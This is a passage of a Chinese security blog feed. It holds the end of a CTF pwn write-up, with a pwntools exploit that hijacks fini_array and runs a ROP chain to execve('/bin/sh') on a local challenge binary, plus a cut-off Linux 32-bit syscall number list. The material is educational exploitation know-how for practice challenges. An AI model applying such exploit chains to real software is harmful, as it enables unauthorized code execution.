class="line">.text:<span class="number">0000000000401B</span>24                 call    sub_4020B0</span><br><span class="line">.text:<span class="number">0000000000401B</span>2A                 hlt</span><br><span class="line">.text:<span class="number">0000000000401B</span>2A ; &#125; <span class="comment">// starts at 401B00</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>2A start           endp</span><br></pre></td></tr></table></figure><p>依据规律知道三个 mov 依次是处理 __libc_start_fini、__libc_start_init、main 。从这里获取到关键参数： __libc_start_fini、main 地址。</p><p>然后 gdb 调试，断点打在 __libc_start_fini ，一直运行到 call 指令，rbp 存储的值就是 fini_array[0] 的地址 0x4b80b0 ：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-07-Fao8iqPT0I2CQDVU.png"></p><p>leave_ret 和 ret 通过 ROPgadget 直接能查到；rax、rdi、rsi、rdx 传参 gadget 也能找到，这几个 gadget 找那种只穿一个寄存器的：<code>pop rax;ret</code>。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hijack fini</span></span><br><span class="line">libc_csu_fini = <span class="number">0x0402CB0</span></span><br><span class="line">main_addr = <span class="number">0x0401C1D</span></span><br><span class="line">fini_array = <span class="number">0x4b80b0</span></span><br><span class="line">esp = fini_array + <span class="number">0x10</span></span><br><span class="line">leave_ret = <span class="number">0x0401cf3</span></span><br><span class="line">ret = <span class="number">0x0401016</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&#x27;/bin/sh&#x27;,0,0)</span></span><br><span class="line">rop_syscall = <span class="number">0x46F745</span></span><br><span class="line">rop_pop_rax = <span class="number">0x0000000000448fcc</span></span><br><span class="line">rop_pop_rdx = <span class="number">0x0000000000448415</span></span><br><span class="line">rop_pop_rsi = <span class="number">0x0000000000406f80</span></span><br><span class="line">rop_pop_rdi = <span class="number">0x0000000000401746</span></span><br><span class="line">bin_sh_addr = <span class="number">0x492895</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;addr:&#x27;</span>,p64(addr))</span><br><span class="line">p.sendafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack fini_array</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x0402CB0&#x27;</span>)</span><br><span class="line">write(fini_array,p64(libc_csu_fini) + p64(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">write(esp,p64(rop_pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(rop_pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(rop_pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(rop_pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(rop_syscall))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack pivoting</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">write(fini_array,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="补充总结"><a href="#补充总结" class="headerlink" title="补充总结"></a>补充总结</h3><h5 id="怎么找-fini-array-？"><a href="#怎么找-fini-array-？" class="headerlink" title="怎么找 fini_array ？"></a>怎么找 fini_array ？</h5><p>首先 fini_array 是 __libc_csu_fini 函数里面会用的一个列表，当程序退出时会调用这个数组存放的一个或两个函数，调用完成后才继续完成退出函数，这时才是真正退出程序。</p><h6 id="64-位静态链接程序"><a href="#64-位静态链接程序" class="headerlink" title="64 位静态链接程序"></a>64 位静态链接程序</h6><p>fini_array 数组长度为 0x10 字节，里面放了两个函数地址，退出 main 函数会先执行 fini_array[1] ，然后执行 fini_array[0] 。</p><p>在<a href="https://www.mrskye.cn/archives/173">劫持 64 位静态程序 fini_array 进行 ROP 攻击</a>里面接触的是 64 位静态编译的程序，程序是没有符号表的，寻找 fini_array 方法是：</p><p>首先 <code>readelf -h 程序名</code> 查看程序加载入口地址。</p><p>gdb 调试将断点打在入口地址 ，然后找到有三个传参的 mov 指令，mov r8 就是 __libc_csu_fini 的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A60                 public start</span><br><span class="line">.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A60 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A60                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A62                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A65                 pop     rsi</span><br><span class="line">.text:0000000000401A66                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A6D                 push    rax</span><br><span class="line">.text:0000000000401A6E                 push    rsp</span><br><span class="line">.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini</span><br><span class="line">.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init</span><br><span class="line">.text:0000000000401A7D                 mov     rdi, offset main</span><br><span class="line">.text:0000000000401A84                 db      67h</span><br><span class="line">.text:0000000000401A84                 call    __libc_start_main</span><br><span class="line">.text:0000000000401A8A                 hlt</span><br><span class="line">.text:0000000000401A8A ; &#125; // starts at 401A60</span><br><span class="line">.text:0000000000401A8A start           endp</span><br></pre></td></tr></table></figure><p>然后 <code>x /20i addr</code> 查看该地址开始的汇编，找到 <code>lea    rbp,[rip+0xb***1] # 0x4***f0</code> ，这个地址就是 fini_array[1] 的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20i 0x402bd0</span></span><br><span class="line">  0x402bd0 &lt;__libc_csu_fini&gt;:    push   rbp</span><br><span class="line">  0x402bd1 &lt;__libc_csu_fini+1&gt;:    lea    rax,[rip+0xb24e8]        # 0x4***c0 </span><br><span class="line">  0x402bd8 &lt;__libc_csu_fini+8&gt;:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 </span><br><span class="line">  0x402bdf &lt;__libc_csu_fini+15&gt;:    push   rbx</span><br><span class="line">  0x402be0 &lt;__libc_csu_fini+16&gt;:    sub    rax,rbp</span><br><span class="line">  0x402be3 &lt;__libc_csu_fini+19&gt;:    sub    rsp,0x8</span><br><span class="line">  0x402be7 &lt;__libc_csu_fini+23&gt;:    sar    rax,0x3</span><br><span class="line">  0x402beb &lt;__libc_csu_fini+27&gt;:    je     0x402c06 &lt;__libc_csu_fini+54&gt;</span><br><span class="line">  0x402bed &lt;__libc_csu_fini+29&gt;:    lea    rbx,[rax-0x1]</span><br><span class="line">  0x402bf1 &lt;__libc_csu_fini+33&gt;:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">  0x402bf8 &lt;__libc_csu_fini+40&gt;:    call   QWORD PTR [rbp+rbx*8+0x0]</span><br><span class="line">  0x402bfc &lt;__libc_csu_fini+44&gt;:    sub    rbx,0x1</span><br><span class="line">  0x402c00 &lt;__libc_csu_fini+48&gt;:    cmp    rbx,0xffffffffffffffff</span><br><span class="line">  0x402c04 &lt;__libc_csu_fini+52&gt;:    jne    0x402bf8 &lt;__libc_csu_fini+40&gt;</span><br><span class="line">  0x402c06 &lt;__libc_csu_fini+54&gt;:    add    rsp,0x8</span><br><span class="line">  0x402c0a &lt;__libc_csu_fini+58&gt;:    pop    rbx</span><br><span class="line">  0x402c0b &lt;__libc_csu_fini+59&gt;:    pop    rbp</span><br><span class="line">  0x402c0c &lt;__libc_csu_fini+60&gt;:    jmp    0x48f52c &lt;_fini&gt;</span><br></pre></td></tr></table></figure><h6 id="64-位动态链接程序"><a href="#64-位动态链接程序" class="headerlink" title="64 位动态链接程序"></a>64 位动态链接程序</h6><p>fini_array 数组长度为 0x8 字节，里面放了一个函数地址，退出 main 函数会执行 fini_array[0]。</p><p>gdb 输入 <code>elf</code> 找 <code>.fini_array</code> ，开始地址就是 fini_array[0] </p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png"></p><p>或者 IDA <code>ctrl+s</code> 找 .fini_array 分段 ：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png"></p><p>64 位中只有 fini_array[0] ，没有 fini_array[1] ，也就是只能运行写入 fini_array 一次，然后就正常退出了。无法像静态编译那样重复调用。</p><h6 id="静态动态利用方式小结"><a href="#静态动态利用方式小结" class="headerlink" title="静态动态利用方式小结"></a>静态动态利用方式小结</h6><p>动态程序目前就遇到 <code>2015 hacklu bookstore</code> 这一题，太菜了总结不出规律。</p><p>静态程序基本上套路是劫持 fini_array + 循环写入，将 ROP 链布置到 fini_array + 0x10 ，写入完成后将栈迁移到 fini_array + 0x10 执行 ROP 链。静态程序的总结可以看看<a href="https://www.freebuf.com/articles/system/226003.html">淇淇师傅文章</a>。</p><h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.freebuf.com/articles/system/226003.html">详解64位静态编译程序的fini_array劫持及ROP攻击</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
            <tag> fini_array </tag>
            
            <tag> 64位静态程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux系统调用号查询(pwn)</title>
      <link href="archives/fac29c2a/"/>
      <url>archives/fac29c2a/</url>
      
        <content type="html"><![CDATA[<p>在线查询链接：<a href="https://syscalls.w3challs.com/">https://syscalls.w3challs.com/</a></p><p>分为32位和64位,链接中还有arm、mips等架构的系统调用号。</p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/<span class="keyword">asm</span>/unistd_32.h </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_break 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldstat 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mount 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stime 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ptrace 26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldfstat 28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utime 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stty 31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gtty 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access 33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nice 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftime 35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rename 38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdir 39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rmdir 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup 41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_times 43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prof 44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid 46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid 47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signal 48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid 49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_acct 51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount2 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lock 53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mpx 56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpgid 57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ulimit 58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldolduname 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umask 60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chroot 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ustat 62</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2 63</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getppid 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgrp 65</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsid 66</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaction 67</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sgetmask 68</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ssetmask 69</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid 70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid 71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigsuspend 72</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigpending 73</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sethostname 74</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setrlimit 75</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrlimit 76</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrusage 77</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday 78</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_settimeofday 79</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups 80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups 81</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select 82</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlink 83</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldlstat 84</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlink 85</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uselib 86</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapon 87</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_reboot 88</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readdir 89</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 91</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate 92</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate 93</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmod 94</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown 95</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpriority 